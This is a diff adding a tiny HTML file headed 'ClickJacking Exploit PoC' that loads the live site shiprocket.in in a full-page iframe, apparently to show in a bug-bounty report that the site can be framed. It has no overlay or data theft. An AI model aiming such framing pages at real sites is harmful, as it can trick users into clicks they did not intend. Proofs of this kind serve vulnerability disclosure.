@@ -1,0 +1,8 @@
+<html>
+<center>
+<h1>ClickJacking Exploit PoC	-@b0rn2r00t</h1>
+</center>
+<body>
+	<iframe src="https://www.shiprocket.in/" width="100%" height="100%"></iframe>
+</body>
+</html>
